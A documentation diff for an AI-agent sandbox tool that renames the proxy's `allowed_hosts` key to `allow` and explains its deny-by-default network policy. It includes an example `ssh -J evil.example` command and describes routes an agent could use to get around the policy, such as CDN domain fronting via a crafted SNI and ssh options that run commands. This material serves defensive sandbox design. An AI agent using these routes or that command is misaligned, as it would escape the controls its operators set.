@@ -119,9 +119,9 @@ It is opt-in and should stay that way. The honest reasons to reach for it are ru
 
 ## Proxy Details (`--proxy`)
 
-The `[network]` block supports `allowed_hosts` and `[[network.allowed_routes]]` for granular controls.
+The `[network]` block supports `allow` (with `allowed_hosts` accepted as a legacy synonym) and `[[network.allowed_routes]]` for granular controls.
 
-- **Default Policy**: The policy is always **deny by default**. To allow all traffic, specify `allowed_hosts = ["*"]` or `allowed_hosts = ["*:port"]`.
+- **Default Policy**: The policy is always **deny by default**. To allow all traffic, specify `allow = ["*"]` or `allow = ["*:port"]`.
 - **Policy sources**: `--proxy` uses workspace `[network]` configuration from `AGENTS.md` and `--config` files, plus `~/.config/agent-sandbox/policies/<agent>.toml` if one exists for the launched agent. `--no-agents-md` omits only `AGENTS.md`; `--config` files remain active. `--policy NAME` additionally merges the named host-owned policy, and requires `--proxy` — passing `--policy` without `--proxy` refuses the launch rather than turning the proxy on implicitly. `--policy` may be repeated. `--no-policy` skips all selected and implicit host-owned policies while retaining workspace configuration; a later `--policy NAME` re-enables them.
 - **Policy trust**: Policies are read from `$XDG_CONFIG_HOME/agent-sandbox/policies/` or `~/.config/agent-sandbox/policies/` and are host-controlled configuration. `AGENTS.md` and explicit `--config` files are project-controlled configuration. Neither source can add a deny directive; the firewall remains deny-by-default.
 - **Wildcards**: Wildcards are supported for domains (e.g., `*.github.com:443`). A strict domain like `github.com:443` matches that exact domain and **does not** match subdomains like `status.github.com:443`. A wildcard matches both the subdomains and the apex, so `*.github.com:443` alone covers `github.com` as well.
@@ -129,7 +129,7 @@ The `[network]` block supports `allowed_hosts` and `[[network.allowed_routes]]` 
 - **L7 Filtering (`[[network.allowed_routes]]`)**: Restricts HTTPS traffic by method and URL path. 
   - Rules use glob matching (`*` matches a single segment, `**` matches multiple).
   - L7 filtering requires MITM decryption. The proxy automatically activates MITM for domains with L7 rules.
-  - The proxy then opens its own TLS connection to the origin and offers TLS 1.3 and 1.2, verified against the bundled Mozilla roots. Origins that stop at TLS 1.2, such as `registry.npmjs.org`, are reachable through an L7 rule just as they are through a plain `allowed_hosts` entry.
+  - The proxy then opens its own TLS connection to the origin and offers TLS 1.3 and 1.2, verified against the bundled Mozilla roots. Origins that stop at TLS 1.2, such as `registry.npmjs.org`, are reachable through an L7 rule just as they are through a plain `allow` entry.
   - **The MITM path also pins the tunnel to the host it authorized.** After terminating TLS it requires the tunnel's inner SNI to equal the `CONNECT` authority and denies a mismatch (`sni-mismatch`). So an `[[network.allowed_routes]]` rule does double duty: it filters by method and path, **and** it closes domain fronting for that host (see [What the policy covers](#what-the-policy-covers)). A blind (non-L7) host has no such check — the proxy never sees its inner SNI.
 - **Secret Injection**: When `--secrets` is passed, the launcher reads `~/.config/agent-sandbox/trusted.toml` and cross-references it with the `[[network.allowed_routes]]` blocks that name a `secret`. It then calls `secretspec export` on the host to fetch the actual secrets, delivering them to the sidecar via a read-only memory mount. Secrets never enter the sandbox environment.
   - Secret-bearing routes may come from `AGENTS.md`, explicit `--config` files, or selected host-owned policies. Every project-controlled request still requires exact host-side authorization in `trusted.toml`.
@@ -138,14 +138,14 @@ The `[network]` block supports `allowed_hosts` and `[[network.allowed_routes]]` 
   - Where two authorized routes could match the same request, the more specific wins: longest domain pattern, then the longest literal path prefix before any `*` (a pattern without `**` breaking a tie, so the default `"/**"` loses to every narrower path), then an exact method over `*`.
   - Note that MITM secret injection only supports HTTP/1.1; h2-only clients will fail the TLS handshake.
 - **Mounts outside the workspace**: the same boundary again. A `[mounts]` source that resolves outside the workspace, symlinks followed, is mounted only when `trusted.toml` names the same source, destination and options; otherwise the launch halts with the `[mounts]` block to add. See [Configuration](configuration.md#2-mounts).
-- **SSH host keys**: the same boundary, applied to a second thing `AGENTS.md` must not decide. An `allowed_hosts` entry covering port 22 authorizes SSH to that host; *which key is that host* comes from `[[network.known_hosts]]` in `~/.config/agent-sandbox/trusted.toml`, and a policy that authorizes SSH to a host with no such entry halts at startup with the block to add (or, in interactive terminals for known forges, prompts the operator to automatically append the published keys after viewing a diff). The authorized keys are written beside the policy, mounted read-only into both the sandbox and the sidecar, and are the whole trusted set — nothing in the session can add to them, so a rule added at runtime can widen *reach* but never *identity*.
-  - The check keys off the compiled policy's `allow_signing`, which exists only for an `allowed_hosts` entry covering 22 — so a port list or range covering it is caught on the same terms as a lone `":22"`.
+- **SSH host keys**: the same boundary, applied to a second thing `AGENTS.md` must not decide. An `allow` entry covering port 22 authorizes SSH to that host; *which key is that host* comes from `[[network.known_hosts]]` in `~/.config/agent-sandbox/trusted.toml`, and a policy that authorizes SSH to a host with no such entry halts at startup with the block to add (or, in interactive terminals for known forges, prompts the operator to automatically append the published keys after viewing a diff). The authorized keys are written beside the policy, mounted read-only into both the sandbox and the sidecar, and are the whole trusted set — nothing in the session can add to them, so a rule added at runtime can widen *reach* but never *identity*.
+  - The check keys off the compiled policy's `allow_signing`, which exists only for an `allow` entry covering 22 — so a port list or range covering it is caught on the same terms as a lone `":22"`.
   - The relay's `ssh` is pointed at that file explicitly (`-o UserKnownHostsFile=`), because it runs in the sidecar as `root`, whose home is `/root` rather than the image's `HOME`. The injection is unconditional: the relay **refuses** an invocation that sets `UserKnownHostsFile`, `GlobalKnownHostsFile`, `StrictHostKeyChecking` or `VerifyHostKeyDNS` itself, and refuses `-F` for the same reason — an alternate config could set any of them out of sight. Which keys are trusted is settled in `trusted.toml`, on the host, and is not a decision the sandbox gets to revisit per invocation.
   - The relay also refuses `-J` / `ProxyJump`, which would otherwise pass the destination check and then connect somewhere else entirely: `ssh -J evil.example git@github.com` really is destined for github.com, and reaches it by first authenticating to `evil.example` with the forwarded agent. `ProxyCommand`, `LocalCommand`, `PermitLocalCommand` and `ProxyUseFdpass` were already refused, for the neighbouring reason that they run a command of the caller's choosing next to that socket.
   - Port forwards (`-L`, `-R`, `-D`, `-W`) are *not* refused. They do not move the connection off the authorized host; what they can reach is whatever that host is willing to forward, which is the host's decision rather than the sandbox's.
-- When L7 filtering is active, the launcher mounts a session CA and the entrypoint exports a merged trust bundle (`SSL_CERT_FILE`, `NIX_SSL_CERT_FILE`, `GIT_SSL_CAINFO`, `REQUESTS_CA_BUNDLE`, `CURL_CA_BUNDLE`, `NODE_EXTRA_CERTS`) for in-sandbox clients, plus a JKS truststore named by `MAVEN_OPTS` for Maven and `JAVA_TOOL_OPTIONS` for Java processes. The JVM reads none of the other bundle variables. Operator truststore paths or incompatible type overrides can take precedence; the entrypoint warns when they may make the generated JKS unreadable or omit the session CA. Type-only overrides keep the generated path, and the supported JDK can read JKS in PKCS12 compatibility mode. With no `[[network.allowed_routes]]` in the launch policy nothing is ever intercepted, so no CA is mounted and ordinary HTTPS stays end-to-end authenticated. The corollary is that an L7 rule added mid-session (`ctl policy allow --l7`, or `h` in the TUI) has no CA behind it; both say so rather than leaving you with certificate errors. Declare the rule in `AGENTS.md` and relaunch.
+- When L7 filtering is active, the launcher mounts a session CA and the entrypoint exports a merged trust bundle (`SSL_CERT_FILE`, `NIX_SSL_CERT_FILE`, `GIT_SSL_CAINFO`, `REQUESTS_CA_BUNDLE`, `CURL_CA_BUNDLE`, `NODE_EXTRA_CERTS`) for in-sandbox clients, plus a JKS truststore named by `MAVEN_OPTS` for Maven and `JAVA_TOOL_OPTIONS` for Java processes. The JVM reads none of the other bundle variables. Operator truststore paths or incompatible type overrides can take precedence; the entrypoint warns when they may make the generated JKS unreadable or omit the session CA. Type-only overrides keep the generated path, and the supported JDK can read JKS in PKCS12 compatibility mode. With no L7 routes (short-form in `allow` or `[[network.allowed_routes]]` tables) in the launch policy nothing is ever intercepted, so no CA is mounted and ordinary HTTPS stays end-to-end authenticated. The corollary is that an L7 rule added mid-session (`ctl policy allow --l7`, or `h` in the TUI) has no CA behind it; both say so rather than leaving you with certificate errors. Declare the rule in `AGENTS.md` and relaunch.
 - Non-secret HTTPS remains blind `CONNECT` + byte pump. Only domains subject to L7 filtering or secret injection are decrypted.
-- **Relay Architecture**: When `--proxy` is combined with `--ssh` or `--gpg`, the direct socket mounts are replaced with a relay server running in the sidecar. Each flag still gates only its own capability: `--gpg` alone is sufficient for commit signing, exactly as without `--proxy`, while `--ssh` push/pull additionally needs an `allowed_hosts` entry naming the destination in `AGENTS.md`.
+- **Relay Architecture**: When `--proxy` is combined with `--ssh` or `--gpg`, the direct socket mounts are replaced with a relay server running in the sidecar. Each flag still gates only its own capability: `--gpg` alone is sufficient for commit signing, exactly as without `--proxy`, while `--ssh` push/pull additionally needs an `allow` entry naming the destination in `AGENTS.md`.
 - An invalid `[network]` block, or an unknown key in one, refuses the launch rather than starting with a policy that silently allows more than you wrote. See [Configuration](configuration.md#rules-the-launcher-refuses) for the combinations that are rejected.
 - `--proxy` with no `AGENTS.md`, no matching agent policy, and no `--policy` defaults to deny all.
 - **A degraded start is a warning, not a failure.** If the proxy cannot prove egress within 30s it serves anyway and the launcher says so. No rule is relaxed by this; requests may simply fail.
@@ -199,7 +199,7 @@ Everything below is the *policy* applied at the proxy. Two limits remain by desi
 described at the end of this section.
 
 Rules match on host **and** port, written in the same string, e.g.
-`allowed_hosts = ["github.com:443", "api.github.com:443"]`. The port is
+`allow = ["github.com:443", "api.github.com:443"]`. The port is
 optional; an entry written without one (`"github.com"`) falls back to the
 built-in default set of **80, 443 and 22** rather than to every port, so write
 the port whenever the host should be reachable on anything else.
@@ -231,10 +231,10 @@ range back explicitly when you need it:
 
 ```toml
 [network]
-allowed_hosts = ["10.0.0.0/8"]   # corporate git over the VPN
+allow = ["10.0.0.0/8"]   # corporate git over the VPN
 ```
 
-An IP CIDR block in `[network].allowed_hosts` of equal or greater specificity than a deny wins, at the proxy *and* in
+An IP CIDR block in `[network].allow` of equal or greater specificity than a deny wins, at the proxy *and* in
 the sidecar's routing table: the kernel's longest-prefix match is the same rule the proxy
 applies, so a re-allowed range is genuinely reachable rather than permitted by the policy and
 then dropped by a route.
@@ -277,19 +277,15 @@ not *whether* arbitrary data can leave or a chosen origin can be reached through
   makes any Fastly tenant reachable (e.g. `crates.io`) by presenting that tenant's name as the
   inner SNI. This takes a deliberately crafted request — ordinary traffic never hits it — but it
   is available to an agent that goes looking. To pin a host to its own origin and close fronting,
-  give it an `[[network.allowed_routes]]` rule so it takes the SNI-checked MITM path (above). The
-  minimal rule forces MITM without otherwise restricting the host's traffic:
+  give it a route (such as a short-form entry in `allow`) so it takes the SNI-checked MITM path
+  (above). The minimal short-form entry forces MITM without otherwise restricting the host's
+  traffic:
 
   ```toml
   [network]
-  allowed_hosts = ["channels.nixos.org:443"]
-
   # Force the MITM path so the tunnel is pinned to this host (closes CDN fronting),
-  # without otherwise restricting its traffic. `/**` matches every path; `*` every method.
-  [[network.allowed_routes]]
-  host   = "channels.nixos.org:443"
-  method = "*"
-  path   = "/**"
+  # without otherwise restricting its traffic.
+  allow = ["* channels.nixos.org:443"]
   ```
 
   This decrypts the host at the proxy: a session CA is mounted and trusted in-sandbox
@@ -332,7 +328,7 @@ $ agent-sandbox ctl policy allow 8443
   reloading   the proxy applies this within a second
 ```
 
-`allowed_hosts` infers what kind of entry you gave it — domain, address or port — and prints back
+`ctl policy allow` infers what kind of entry you gave it — domain, address or port — and prints back
 what it decided.
 
 **Deny rules are built-in only.** There is no `proxy deny`, no `deny` key in `AGENTS.md`,
@@ -350,7 +346,7 @@ The baseline ranges appear in `show` as ordinary `deny_ip` rules attributed to `
 `reset`. `policy export` omits them, since they are always enforced regardless of what
 `AGENTS.md` declares and round-tripping them into a new config would be redundant.
 
-An IP CIDR block in `[network].allowed_hosts` of equal or greater specificity is the only way to
+An IP CIDR block in `[network].allow` of equal or greater specificity is the only way to
 reach one of those ranges — and it is an *allow*, not a deny, which is why it remains
 available: it is how a corporate git server over a VPN is reached.
 
